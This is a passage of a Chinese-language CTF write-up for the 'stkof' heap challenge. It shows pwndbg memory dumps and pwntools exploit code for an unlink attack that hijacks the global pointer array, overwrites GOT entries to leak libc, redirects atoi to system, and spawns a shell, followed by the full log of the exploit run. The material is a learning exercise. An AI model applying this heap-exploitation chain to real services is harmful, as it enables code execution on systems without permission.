0x602158:	0x0000000000e05980	0x0000000000000000
0x602168:	0x0000000000000000	0x0000000000000000
0x602178:	0x0000000000000000	0x0000000000000000
0x602188:	0x0000000000000000	0x0000000000000000
0x602198:	0x0000000000000000	0x0000000000000000
0x6021a8:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

① fake_chunk被摘除时首先执行：first_bk = third_addr，也就是说first_chunk的bk由原来指向fake_chunk地址更改成指向third_chunk地址：

```python
#摘除第一步完成，first_chunk
pwndbg> x/16gx 0x602138
0x602138:	0x0000000000000000	0x0000000000000000
0x602148:	0x0000000000e05420	0x0000000000602140
            #fd                 #bk
0x602158:	0x0000000000e05980	0x0000000000000000
0x602168:	0x0000000000000000	0x0000000000000000
0x602178:	0x0000000000000000	0x0000000000000000
0x602188:	0x0000000000000000	0x0000000000000000
0x602198:	0x0000000000000000	0x0000000000000000
0x6021a8:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

② 接下来执行`third_fd = first_addr`，即third_chunk的fd由由原来指向fake_chunk地址更改成first_chunk地址：

```python
#摘除第二步完成，third_chunk
pwndbg> x/16gx 0x602140
0x602140:	0x0000000000000000	0x0000000000e05420 
0x602150:	0x0000000000602138	0x0000000000e05980 
            #fd                 #bk
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
0x6021a0:	0x0000000000000000	0x0000000000000000
0x6021b0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

这里需要注意的是`third_chunk的fd`与`first_chunk的bk`更改的其实是一个位置，但是由于third_fd = first_addr`后执行`，所以此处内容会从0x602140被覆盖成0x602138

最后free(chunk3)：

```python
#摘除第二步完成，third_chunk
pwndbg> x/16gx 0x602140
0x602140:	0x0000000000000000	0x0000000000e05420 
0x602150:	0x0000000000602138	0x0000000000000000 
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
0x6021a0:	0x0000000000000000	0x0000000000000000
0x6021b0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

## 5、泄露函数地址
好了，上面就是这道题完整的unlink过程了，由于这个程序本身并没有system("/bin/sh")，所以接下来需要考虑的就是通过泄露的方式来从libc中寻找了。在泄露之前呢，我们先看一下，经过unlink之后堆地址指针数组变成了什么样子，因为再怎么说，我们也得从程序修改功能中输入来控制执行流程，所以这部分还得是从指针数组（以下简称s[]数组）入手：

```python
pwndbg> x/16gx 0x602140
0x602140:	0x0000000000000000	0x0000000000e05420 #s[0] s[1]
0x602150:	0x0000000000602138	0x0000000000000000 #s[2] 原s[3]
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
```

可以看到经过unlink之后chunk指针数组内部变成了这样。s[1]就是chunk1的data指针，因为整个过程中chunk1并没有使用过，所以s[1]并无大碍。但是s[2]的位置原本是chunk2的data指针，经过unlink之后变成了`0x602138`。最后就是s[3]了，这里原本是chunk3的data指针，但是由于前面为了触发unlink，所以chunk3被释放了，所以s[3]中被置空。

那么我们去想，如果我们在主界面选择修改功能，并且选择修改chunk2，那么实际上输入的内容并不会写进chunk2，而是写进`0x602138`：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601195372253-3b329d49-bc26-4252-b075-3f192fe9220a.png)

那么这样一来，我们可以通过修改s[2]的方式来对s[]数组进行部署函数的got地址，再次修改s[]数组的时候就会修改got中的函数地址，这和前面的几篇文章的套路差不多。

首先看第一步，向s[]数组中部署函数got地址：

```python
log.info("Overwriting global pointers...")
payload = 'a' * 8 + p64(free_got) + p64(puts_got) + p64(atoi_got)
edit(2, len(payload), payload)
p.recvuntil("OK")
log.success("Complete!")
time.sleep(1)
```

根据上面的payload修改s[2]：主界面–> 2–> 2–> payload：

```python
#摘除第一步完成，first_chunk
pwndbg> x/16gx 0x602138
0x602138:	0x6161616161616161	0x0000000000602018                 #free_addr(s[0])
0x602148:	0x0000000000e05420	0x0000000000602140 #puts_addr(s[1]) atoi_addr(s[2])
            #fd                 #bk
0x602158:	0x0000000000e05980	0x0000000000000000
0x602168:	0x0000000000000000	0x0000000000000000
0x602178:	0x0000000000000000	0x0000000000000000
0x602188:	0x0000000000000000	0x0000000000000000
0x602198:	0x0000000000000000	0x0000000000000000
0x6021a8:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

这样一来free()函数、puts()函数、atoi()函数就已经在s[]数组中部署好了。可以看到如果再次修改s[0]的话其实修改的是free()函数的真实地址，再次修改s[1]的话其实修改的是puts()函数的真实地址，再次修改s[2]的话其实修改的是atoi()函数的真实地址。

那么接下来，如果将s[0]，即free()函数got中的真实地址修改成puts_plt的话，释放调用free()函数就相当于调用puts()函数了。那么如果释放的是s[1]的话就可以泄露出puts()函数的真实地址了：

```python
log.info("Finding address in program...")
free_got = elf.got["free"]
puts_got = elf.got["puts"]
atoi_got = elf.got["atoi"]
puts_plt = elf.plt["puts"]
time.sleep(1)
log.success("free@got : 0x%x" % free_got)
log.success("puts@got : 0x%x" % puts_got)
log.success("atoi@got : 0x%x" % atoi_got)
log.success("puts@plt : 0x%x" % puts_plt)
time.sleep(1)
log.info("Changing free@got --> puts@plt...")
payload2 = p64(puts_plt)
edit(0, len(payload2), payload2)
time.sleep(1)
p.recvuntil("OK")
```

再次根据上面的payload手动修改修改s[0]：主界面–> 2–> 0–> payload

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601195372033-fcef2929-4016-4100-9d17-7c3e0d257d78.png)

接下来就是释放s[1]了，虽然是调用`free(puts_got)`，但实际上是`puts(puts_got)`，需要注意的是我们接收泄露的地址的时候需要用`\x00`补全，并且用u64()转换一下才能用：

```python
log.info("Leaking address...")
delete(1)
p.recvuntil("FAIL\n")
puts_addr = u64(p.recv(6) + '\x00\x00')
log.success("puts address : 0x%x" % puts_addr)
time.sleep(1)
p.recvuntil("OK")
```

## 6、查找system()函数和/bin/sh字符串
这部分就没什么好说的了吧，从栈溢出开始就是这个路子😂

```python
log.info("Finding offset in libc...")
time.sleep(1)
puts_offset = libc.symbols["puts"]
log.success("atoi offset: 0x%x" % puts_offset)
time.sleep(1)
log.info("Calculating libc address...")
time.sleep(1)
libc_addr = puts_addr - puts_offset
log.success("Libc address: 0x%x" % libc_addr)
log.info("Calculating system & /bin/sh address...")
system_addr = libc_addr + libc.symbols["system"]
binsh = libc_addr + libc.search("/bin/sh").next()
log.success("system address: 0x%x" % system_addr)
log.success("/bin/sh address: 0x%x" % binsh)
time.sleep(1)
```

## 7、拿shell！
到了最后一步了，还是用前面的思路，我们将部署在s[2]中的atoi_got中的地址修改成前面找到的system()函数地址，这样一来在接收字符串调用atoi()函数的时候实际上调用的是system()函数：

```python
log.info("Changing atoi@got --> system@got...")
payload3 = p64(system_addr)
edit(2, len(payload3) + 1, payload3)
time.sleep(1)
p.recvuntil("OK")
log.info("Now atoi@got is system@got, so just pass the string '/bin/sh' to atoi")
log.info("Actually we called system('/bin/sh') !")
time.sleep(1)
p.send(p64(binsh))
log.info("Ready in 5 seconds...")
time.sleep(5)
gdb.attach(p)
log.success("PWN!!")
p.interactive()
```

再次根据上面的payload修改s[2]：主界面–> 2–> 2–> payload

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601195372045-7bdbb94b-c535-4fd4-a38e-0ad73f2e1d1c.png)

最后我们在等待输入的时候输入/bin/sh字符串的地址就可以了，看起来是`atoi("/bin/sh")`，但实际上执行的是`system("/bin/sh")`

# exp详细执行信息
```powershell
➜  unlink_data python exp.py 
[DEBUG] PLT 0x1f7f0 realloc
[DEBUG] PLT 0x1f800 __tls_get_addr
[DEBUG] PLT 0x1f820 memalign
[DEBUG] PLT 0x1f850 _dl_find_dso_for_object
[DEBUG] PLT 0x1f870 calloc
[DEBUG] PLT 0x1f8a0 malloc
[DEBUG] PLT 0x1f8a8 free
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] PLT 0x400750 free
[DEBUG] PLT 0x400760 puts
[DEBUG] PLT 0x400770 fread
[DEBUG] PLT 0x400780 strlen
[DEBUG] PLT 0x400790 __stack_chk_fail
[DEBUG] PLT 0x4007a0 printf
[DEBUG] PLT 0x4007b0 alarm
[DEBUG] PLT 0x4007c0 __libc_start_main
[DEBUG] PLT 0x4007d0 fgets
[DEBUG] PLT 0x4007e0 atoll
[DEBUG] PLT 0x4007f0 __gmon_start__
[DEBUG] PLT 0x400800 malloc
[DEBUG] PLT 0x400810 fflush
[DEBUG] PLT 0x400820 atol
[DEBUG] PLT 0x400830 atoi
[*] '/home/ubuntu/Desktop/unlink_data/stkof_patch'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './stkof_patch' argv=['./stkof_patch'] : pid 16904
[*] Creating chunk1, avoid stdout's buffer.
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Sent 0x4 bytes:
    '256\n'
[DEBUG] Received 0x5 bytes:
    '1\n'
    'OK\n'
[*] Creating chunk2...
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x5 bytes:
    '2\n'
    'OK\n'
[*] Creating chunk3...
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Sent 0x4 bytes:
    '128\n'
[DEBUG] Received 0x5 bytes:
    '3\n'
    'OK\n'
[*] Creating fake chunk...
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x3 bytes:
    '64\n'
[DEBUG] Sent 0x41 bytes:
    00000000  00 00 00 00  00 00 00 00  30 00 00 00  00 00 00 00  │····│····│0···│····│
    00000010  38 21 60 00  00 00 00 00  40 21 60 00  00 00 00 00  │8!`·│····│@!`·│····│
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000030  30 00 00 00  00 00 00 00  90 00 00 00  00 00 00 00  │0···│····│····│····│
    00000040  0a                                                  │·│
    00000041
[DEBUG] Received 0x8 bytes:
    'OK\n'
    'FAIL\n'
[*] Now we have fake chunks, just free chunk3 to change global pointer...
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x3 bytes:
    'OK\n'
[+] Global pointer has been changed!
[*] Finding address in program...
[+] free@got : 0x602018
[+] puts@got : 0x602020
[+] atoi@got : 0x602088
[+] puts@plt : 0x400760
[*] Overwriting global pointers...
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x3 bytes:
    '32\n'
[DEBUG] Sent 0x21 bytes:
    00000000  61 61 61 61  61 61 61 61  18 20 60 00  00 00 00 00  │aaaa│aaaa│· `·│····│
    00000010  20 20 60 00  00 00 00 00  88 20 60 00  00 00 00 00  │  `·│····│· `·│····│
    00000020  0a                                                  │·│
    00000021
[DEBUG] Received 0x8 bytes:
    'OK\n'
    'FAIL\n'
[+] Complete!
[*] Changing free@got --> puts@plt...
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Sent 0x2 bytes:
    '8\n'
[DEBUG] Sent 0x9 bytes:
    00000000  60 07 40 00  00 00 00 00  0a                        │`·@·│····│·│
    00000009
[DEBUG] Received 0x8 bytes:
    'OK\n'
    'FAIL\n'
[*] Leaking address...
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xa bytes:
    00000000  a0 f6 50 a8  38 7f 0a 4f  4b 0a                     │··P·│8··O│K·│
    0000000a
[+] puts address : 0x7f38a850f6a0
[*] Finding offset in libc...
[+] atoi offset: 0x6f6a0
[*] Calculating libc address...
[+] Libc address: 0x7f38a84a0000
[*] Calculating system & /bin/sh address...
[+] system address: 0x7f38a84e53a0
[+] /bin/sh address: 0x7f38a862ce17
[*] Changing atoi@got --> system@got...
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x2 bytes:
    '9\n'
[DEBUG] Sent 0x9 bytes:
    00000000  a0 53 4e a8  38 7f 00 00  0a                        │·SN·│8···│·│
    00000009
[DEBUG] Received 0x3 bytes:
    'OK\n'
[*] Now atoi@got is system@got, so just pass the string '/bin/sh' to atoi
[*] Actually we called system('/bin/sh') !
[DEBUG] Sent 0x8 bytes:
    00000000  17 ce 62 a8  38 7f 00 00                            │··b·│8···│
    00000008
[*] Ready in 5 seconds...
[+] PWN!!
[*] Switching to interactive mode

$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x19 bytes:
    00000000  73 68 3a 20  31 3a 20 17  ce 62 a8 38  7f 3a 20 6e  │sh: │1: ·│·b·8│·: n│
    00000010  6f 74 20 66  6f 75 6e 64  0a                        │ot f│ound│·│
    00000019
sh: 1: \x17b\xa88\x7f: not found
[DEBUG] Received 0x1e bytes:
    'FAIL\n'
    'sh: 1: s: not found\n'
    'FAIL\n'
FAIL
sh: 1: s: not found
FAIL
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x28 bytes:
    'exp.py\tstkof  stkof_patch  test  test.c\n'
exp.py    stkof  stkof_patch  test  test.c
[DEBUG] Received 0x5 bytes:
    'FAIL\n'
FAIL
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x7 bytes:
    'ubuntu\n'
ubuntu
[DEBUG] Received 0x5 bytes:
    'FAIL\n'
FAIL
$  
```



